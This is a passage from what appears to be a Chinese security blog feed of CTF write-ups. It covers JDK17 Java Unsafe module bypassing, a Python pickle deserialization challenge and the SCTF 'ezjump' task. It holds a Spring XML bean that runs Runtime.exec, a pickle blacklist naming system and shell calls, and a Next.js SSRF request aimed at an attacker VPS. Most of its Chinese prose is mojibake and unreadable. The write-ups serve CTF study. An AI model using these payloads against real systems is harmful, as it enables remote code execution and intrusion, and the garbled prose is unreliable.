class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSafeTools</span> &#123;<br>    <span class="hljs-keyword">static</span> Unsafe unsafe;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UnSafeTools</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setObject</span><span class="hljs-params">(Object o, Field field, Object value)</span> &#123;<br>        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newClass</span><span class="hljs-params">(Class c)</span> <span class="hljs-keyword">throws</span> InstantiationException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(c);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(Class src, Class dst)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getModule</span> <span class="hljs-operator">=</span> dst.getDeclaredMethod(<span class="hljs-string">&quot;getModule&quot;</span>);<br>        getModule.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> getModule.invoke(dst);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(src, addr, <span class="hljs-keyword">module</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Error: &quot;</span> + var1);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>exp.xml</code>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>PAYLOAD<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;command&#x27;)&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114174343672.png" alt="image-20241114174343672"></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>é‚£ä¹ˆå›åˆ°<code>2024GeekCon-AVSS-oldlog</code>ï¼Œå¯ä»¥è¯´åŸé¢˜æ˜¯ç›¸å½“ç²¾å½©ï¼Œè¡ç”Ÿå‡ºä»Šå¹´å¾ˆå¤šJavaé¢˜ç›®çš„æ‰“æ³•ã€‚ä½ å¯ä»¥ä»ä»Šå¹´è®¸å¤šJDK17ååºåˆ—åŒ–é¢˜ç›®ä¸­è½»æ¾åœ°æ‰¾åˆ°å®ƒçš„èº«å½±ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickleååºåˆ—åŒ–çœŸå¾—ä¼šæ‰‹æ“opcodeå§</title>
    <link href="/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/"/>
    <url>/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ˜¨å¤©æœ‰äººè®©æˆ‘å¸®çœ‹ä¸€ä¸ªå‚»é€¼æ–°ç”Ÿèµ›ã€‚</p><p>å…¶å®å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„pickleååºåˆ—åŒ–ç»•è¿‡find_classã€‚</p><p>çœ‹ç€å¾ˆå”¬äººï¼š</p><p>app.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> io<br><br>BLACKLISTED_CLASSES = [<br>    <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>,<span class="hljs-string">&#x27;builtins.eval&#x27;</span>,<span class="hljs-string">&#x27;builtins.exec&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.system&#x27;</span>, <span class="hljs-string">&#x27;os.popen&#x27;</span>, <span class="hljs-string">&#x27;os.popen2&#x27;</span>, <span class="hljs-string">&#x27;os.popen3&#x27;</span>, <span class="hljs-string">&#x27;os.popen4&#x27;</span>, <br>    <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>, <br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>, <br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <br>    <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>, <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span>,<br>    <span class="hljs-string">&#x27;__import__&#x27;</span>,<span class="hljs-string">&#x27;os.spawn*&#x27;</span>,<span class="hljs-string">&#x27;sh.Command&#x27;</span>,<span class="hljs-string">&#x27;imp.load_module&#x27;</span>,<span class="hljs-string">&#x27;builtins.compile&#x27;</span><br>    <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;builtins.execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;builtins.open&#x27;</span>, <span class="hljs-string">&#x27;builtins.file&#x27;</span>, <span class="hljs-string">&#x27;os.system&#x27;</span>, <br>    <span class="hljs-string">&#x27;os.fdopen&#x27;</span>, <span class="hljs-string">&#x27;os.tmpfile&#x27;</span>, <span class="hljs-string">&#x27;os.fchmod&#x27;</span>, <span class="hljs-string">&#x27;os.fchown&#x27;</span>, <span class="hljs-string">&#x27;os.open&#x27;</span>, <span class="hljs-string">&#x27;os.openpty&#x27;</span>, <span class="hljs-string">&#x27;os.read&#x27;</span>, <span class="hljs-string">&#x27;os.pipe&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.chdir&#x27;</span>, <span class="hljs-string">&#x27;os.fchdir&#x27;</span>, <span class="hljs-string">&#x27;os.chroot&#x27;</span>, <span class="hljs-string">&#x27;os.chmod&#x27;</span>, <span class="hljs-string">&#x27;os.chown&#x27;</span>, <span class="hljs-string">&#x27;os.link&#x27;</span>, <span class="hljs-string">&#x27;os.lchown&#x27;</span>, <span class="hljs-string">&#x27;os.listdir&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.lstat&#x27;</span>, <span class="hljs-string">&#x27;os.mkfifo&#x27;</span>, <span class="hljs-string">&#x27;os.mknod&#x27;</span>, <span class="hljs-string">&#x27;os.access&#x27;</span>, <span class="hljs-string">&#x27;os.mkdir&#x27;</span>, <span class="hljs-string">&#x27;os.makedirs&#x27;</span>, <span class="hljs-string">&#x27;os.readlink&#x27;</span>, <span class="hljs-string">&#x27;os.remove&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.removedirs&#x27;</span>, <span class="hljs-string">&#x27;os.rename&#x27;</span>, <span class="hljs-string">&#x27;os.renames&#x27;</span>, <span class="hljs-string">&#x27;os.rmdir&#x27;</span>, <span class="hljs-string">&#x27;os.tempnam&#x27;</span>, <span class="hljs-string">&#x27;os.tmpnam&#x27;</span>, <span class="hljs-string">&#x27;os.unlink&#x27;</span>, <span class="hljs-string">&#x27;os.walk&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.execl&#x27;</span>, <span class="hljs-string">&#x27;os.execle&#x27;</span>, <span class="hljs-string">&#x27;os.execlp&#x27;</span>, <span class="hljs-string">&#x27;os.execv&#x27;</span>, <span class="hljs-string">&#x27;os.execve&#x27;</span>, <span class="hljs-string">&#x27;os.dup&#x27;</span>, <span class="hljs-string">&#x27;os.dup2&#x27;</span>, <span class="hljs-string">&#x27;os.execvp&#x27;</span>, <span class="hljs-string">&#x27;os.execvpe&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.fork&#x27;</span>, <span class="hljs-string">&#x27;os.forkpty&#x27;</span>, <span class="hljs-string">&#x27;os.kill&#x27;</span>, <span class="hljs-string">&#x27;os.spawnl&#x27;</span>, <span class="hljs-string">&#x27;os.spawnle&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlpe&#x27;</span>, <span class="hljs-string">&#x27;os.spawnv&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.spawnve&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvpe&#x27;</span>, <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>,<br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>,<br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <span class="hljs-string">&#x27;glob.glob&#x27;</span>,<br>    <span class="hljs-string">&#x27;linecache.getline&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfile&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy2&#x27;</span>, <span class="hljs-string">&#x27;shutil.move&#x27;</span>,<br>    <span class="hljs-string">&#x27;shutil.make_archive&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen2&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen3&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen4&#x27;</span>, <span class="hljs-string">&#x27;timeit.timeit&#x27;</span>, <span class="hljs-string">&#x27;sys.call_tracing&#x27;</span>,<br>    <span class="hljs-string">&#x27;code.interact&#x27;</span>, <span class="hljs-string">&#x27;code.compile_command&#x27;</span>, <span class="hljs-string">&#x27;codeop.compile_command&#x27;</span>, <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>,<br>    <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span><br>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;module&#125;</span>.<span class="hljs-subst">&#123;name&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> BLACKLISTED_CLASSES:<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;Forbidden class: %s.%s&quot;</span> % (module, name))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().find_class(module, name)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        encoded_data = request.form[<span class="hljs-string">&quot;data&quot;</span>]<br>        decoded_data = base64.b64decode(encoded_data)<br>        <br>        <span class="hljs-keyword">try</span>:<br>            data_stream = io.BytesIO(decoded_data)<br>            unpickler = SafeUnpickler(data_stream)<br>            result = unpickler.load()<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Deserialized data: <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(result)&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error during deserialization: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>ç›´æ¥å¼€æŠ„å§ï¼Œæˆ‘ä¹Ÿæ‡’å¾—å†™äº†ï¼š</p><p><a href="https://xz.aliyun.com/t/14061?u_atoken=9d62d196c00e02f7285bab84cbb8f2c7&u_asig=0a472f9017285482695326969e0055">pickleååºåˆ—åŒ–æ¼æ´åŸºç¡€çŸ¥è¯†ä¸ç»•è¿‡ç®€æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://dummykitty.github.io/python/2023/06/01/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4.html#%E5%AF%BB%E6%89%BE%E6%9C%AA%E8%A2%AB%E9%99%90%E5%88%B6%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE">Pickle ååºåˆ—åŒ–ç»•è¿‡ - DumKiyâ€™s blog (dummykitty.github.io)</a></p><p>ç„¶åç”¨äº†ä¸€ä¸‹pkerè¿™ä¸ªå·¥å…·ï¼Œä¹ŸæŒºå¥½ç”¨ï¼š</p><p><img src="/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/image-20241010161826331.png" alt="image-20241010161826331"></p><p>å¼€å§‹è¿˜æŒºé‚ªé—¨ï¼Œæˆ‘è¯´curlæ‰“ä¸é€šï¼Œè¿˜çŒœæ˜¯ä¸å‡ºç½‘â€¦â€¦.</p><p>æœ¬åœ°è°ƒäº†ä¸€ä¸‹ï¼Œå› ä¸ºååºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œä½†æ˜¯æˆ‘æ‰“çš„payloadæ˜¯ä¸€ä¸ªå¯è¿­ä»£çš„å¯¹è±¡ï¼Œæ‰€ä»¥ä»–å°±ä¼šæŠ¥é”™int is not iterable.</p><p>è€Œä¸”åé¢éƒ½æ˜¯æŠ¥canâ€™t find attribute moduleã€‚</p><p>é‚£ä¹ˆå…¶å®å¯ä»¥çŒœæµ‹åªæœ‰ç¬¬ä¸€æ¬¡èƒ½æ‰“è¿›å»ï¼Œæˆ‘å¼€å§‹æƒ³ä¸å‡ºç½‘ï¼Œéš¾é“è¿˜è¦æˆ‘æ‰“ä¸ªå†…å­˜é©¬ï¼Ÿæ–°ç”Ÿèµ›éƒ½å¼€å§‹è¦è¿™ä¹ˆæ‰‹æ“opcodeäº†å—ï¼Ÿ</p><p>ç»“æœæ˜¯æˆ‘å‚»é€¼äº†ï¼Œä»–è¿™æœºå­æ²¡æœ‰curlï¼Œbashä¸€æŠŠæ¢­äº†ï¼Œè‰¹ã€‚</p><p><img src="/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/image-20241010162045844.png" alt="image-20241010162045844"></p>]]></content>
    
    
    
    <tags>
      
      <tag>å¨±ä¹å‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCTF-WEB-Learning</title>
    <link href="/2024/10/05/sctf-web-learning/"/>
    <url>/2024/10/05/sctf-web-learning/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ‰ç‚¹å°å¯æƒœå§ï¼Œå› ä¸ºå°±å·®ä¸¤é“æˆ‘ä»¬å¤©æ¢å°±ç¬¬ä¸€äº†ã€‚</p><p>è¿˜æ˜¯è‡ªå·±èƒ½åŠ›ä¸å¤Ÿï¼Œè€Œä¸”ä¹Ÿæ²¡èƒ½åŠ›æ‹¿åˆ°è¯ä¹¦ï¼Œé—®å¿ƒæœ‰æ„§ï¼Œå¦‚æœæ‹¿åˆ°xctfä»Šå¹´ç¦»å¤§æ»¡è´¯åˆè¿›ä¸€æ­¥å§ã€‚</p><p>ä½†ç”±äºæˆ‘ä»¬ä¸æ˜¯ç¬¬ä¸€ï¼Œæ‰€ä»¥åˆ†ç«™èµ›è¿˜æœ‰çš„æ‰“ï¼Œç»§ç»­åŠ æ²¹å§ã€‚</p><p>åŒæ—¶è—‰æ­¤å¤ç°ä¸€æ‰‹æ€è·¯ï¼Œå¤‡æˆ˜ä¸‹æ—¬ç½‘é¼æ¯ï¼ˆç›å¾·ç½‘é¼æ¯æ€ä¹ˆå¤©æ¢è€æ€ªç‰©å…¨éƒ½å‡ºå±±äº†ã€‚ã€‚ã€‚ã€‚å“ˆäººï¼‰</p><h2 id="ezjump"><a href="#ezjump" class="headerlink" title="ezjump"></a>ezjump</h2><p>åŸºæœ¬å’Œå­¦é•¿ä»å¤´çœ‹åˆ°å°¾çš„ä¸€é“é¢˜ï¼Œæœ€årediså¤ªæäº†ï¼Œslaveofçš„æ—¶å€™æœåŠ¡å™¨åˆ å·ä½ å°±æ‰“ä¸è¿›å»ï¼ŒOctaneé€šå®µç¿»redisæ–‡æ¡£ç”¨CLIENT PAUSEæ”¹soæ–‡ä»¶æ‰“çš„ï¼Œå¤ªè¶…äººäº†ã€‚</p><p>æˆ‘æœ¬åœ°dockeræ‰“çš„æ—¶å€™ï¼Œæ­»æ´»æ³¨å†Œä¸ä¸Šï¼Œä¹Ÿä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè¿œç¨‹å°±æ²¡é—®é¢˜ã€‚</p><p>å‰é¢æ˜¯ä¸€ä¸ªCVE-2024-34351çš„<code>nextjs</code>æ¼æ´ï¼š</p><p><a href="https://blog.csdn.net/Jayjay___/article/details/140319709#:~:text=CVE-2024-1">CVE-2024-34351 æ¼æ´å¤ç°-CSDNåšå®¢</a></p><p><a href="https://cloud.tencent.com/developer/article/2434587">ã€ç½‘ç»œå®‰å…¨ã€‘ã€Œæ¼æ´å¤ç°ã€ï¼ˆäº”ï¼‰ä» NextJS SSRF æ¼æ´çœ‹ Host å¤´æ»¥ç”¨æ‰€å¸¦æ¥çš„å±å®³-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p>è€Œä¸”dockerfileèƒ½çœ‹åˆ°åç«¯ç½‘å¡ï¼ŒæŠ¥æ–‡ç›´æ¥æ‰“SSRFï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/success</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vps:port<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/x-component<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.193.141:3000/success<br><span class="hljs-attribute">Next-Action</span><span class="hljs-punctuation">: </span>b421a453a66309ec62a2d2049d51250ee55f10fd<br><span class="hljs-attribute">Next-Router-State-Tree</span><span class="hljs-punctuation">: </span>%5B%22%22%2C%7B%22children%22%3A%5B%22success%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------332929687741145380582296740589<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>336<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://vps:port<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;1_$<span class="hljs-type">ACTION_ID_b421a453a66309ec62a2d2049d51250ee55f10fd</span>&quot;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell"></span><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;0&quot;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell">[<span class="hljs-string">&quot;$K1&quot;</span>]</span><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589--</span></span><br><span class="language-haskell"></span><br></code></pre></td></tr></table></figure><p>vpsä¸Šèµ·ä¸€ä¸ªé‡å®šå‘æœåŠ¡ï¼š[SCTF2024 Web&amp;Misc å¤ç° | 0piumâ€™s Blog (hack3r0pium.github.io)](<a href="https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&Misc-%E5%A4%8D%E7%8E%B0/index.html#:~:text=Web">https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-å¤ç°/index.html#:~:text=Web</a> ezju)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 